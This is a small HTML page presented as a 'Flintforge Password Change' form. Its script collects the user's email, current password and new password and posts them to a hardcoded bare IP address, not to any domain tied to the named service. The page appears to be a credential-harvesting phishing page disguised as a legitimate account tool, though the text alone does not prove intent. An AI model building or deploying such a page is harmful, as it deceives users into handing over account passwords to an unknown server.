<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>Flintforge Password Change</title>
  <style>
      :root {
        --bg: #1a1a1a;
        --text: #e0e0e0;
        --input-bg: #2d2d2d;
        --border: #444;
        --btn: #0066cc;
        --btn-hover: #004999;
      }

      @media (prefers-color-scheme: light) {
        :root {
          --bg: #f7f7f7;
          --text: #333;
          --input-bg: #fff;
          --border: #ccc;
        }
      }

      body {
        background: var(--bg);
        color: var(--text);
        font-family: sans-serif;
        max-width: 380px;
        margin: 40px auto;
        padding: 20px;
      }

      input, button {
        width: 100%;
        padding: 10px;
        margin: 8px 0;
        font-size: 16px;
        border-radius: 4px;
        border: 1px solid var(--border);
        box-sizing: border-box;
        background: var(--input-bg);
        color: var(--text);
      }

      input::placeholder {
        color: #888;
      }

      button {
        background: var(--btn);
        color: #fff;
        cursor: pointer;
        font-weight: bold;
      }

      button:hover {
        background: var(--btn-hover);
      }

      #status {
        margin-top: 12px;
        font-weight: bold;
      }
    </style>
</head>
<body>
  <h2>Flintforge Password Change</h2>
  <input id="email" placeholder="Email" type="email" required>
  <input id="old" placeholder="Current Password" type="password" required>
  <input id="new" placeholder="New Password" type="password" required>
  <button onclick="go()">Update</button>
  <div id="status"></div>

  <script>
    async function go() {
      const e = document.getElementById('email').value.trim();
      const o = document.getElementById('old').value;
      const n = document.getElementById('new').value;
      const s = document.getElementById('status');
      if (!e||!o||!n) return s.textContent='Fill all', s.style.color='red';

      s.textContent='Working...'; s.style.color='blue';
      try {
        const r = await fetch('https://162.229.228.112/change-password', {
          method:'POST',
          headers:{'Content-Type':'application/json'},
          body:JSON.stringify({email:e, oldPass:o, newPass:n})
        });
        const j = await r.json();
        s.textContent = j.status==='OK' ? 'Success!' : `Failed: ${j.status}`;
        s.style.color = j.status==='OK'?'green':'red';
      } catch(_) {
        s.textContent='Network error'; s.style.color='red';
      }
    }
  </script>
</body>
</html>
